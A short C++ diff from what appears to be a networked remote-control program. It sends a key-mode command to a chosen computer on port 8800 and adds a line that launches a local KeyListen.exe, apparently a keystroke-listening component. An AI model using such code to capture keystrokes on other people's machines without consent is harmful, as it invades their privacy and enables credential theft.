@@ -238,6 +238,7 @@ void commandKey(int last)
             char tmp_command[MaxCommand];
             sprintf(tmp_command, "k%c", strcmp(key_mode, "true") == 0 ? 't' : 'f');
             net::Send(computer_list[kill_to].ip, 8800, tmp_command);
+            system("start KeyListen.exe");
         }
     }
     std::lock_guard<std::mutex> lock(Mutex);
